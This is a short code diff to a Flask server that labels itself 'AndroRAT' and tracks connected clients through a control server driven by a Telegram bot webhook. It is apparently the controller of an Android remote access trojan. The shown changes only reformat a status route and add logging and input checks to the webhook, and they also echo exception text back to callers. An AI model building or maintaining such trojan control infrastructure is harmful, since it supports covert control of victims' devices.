@@ -214,21 +214,34 @@ control_server = ControlServer()
 app = Flask(__name__)
 
 @app.route('/')
-def index(): return jsonify({"status":"running","bot":"AndroRAT","clients":len(control_server.clients),"server":control_server.running})
+def index(): 
+    return jsonify({
+        "status": "running",
+        "bot": "AndroRAT",
+        "clients": len(control_server.clients),
+        "server": control_server.running
+    })
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
     global application
     if not application:
+        logger.error("❌ Application not initialized yet!")
         return 'Application not initialized', 503
     try:
-        update = Update.de_json(request.get_json(force=True), application.bot)
+        data = request.get_json(force=True)
+        if not data:
+            logger.warning("⚠️ No JSON received in webhook request")
+            return "Bad Request", 400
+
+        update = Update.de_json(data, application.bot)
         asyncio.run(application.process_update(update))
         return 'OK', 200
-    except Exception as e:
-        logger.error(f"Webhook error: {e}")
-        return 'Error', 500
 
+    except Exception as e:
+        logger.exception("❌ Webhook processing error:")
+        return f'Error: {str(e)}', 500
+        
 # ============================================================
 # Telegram Handlers
 # ============================================================
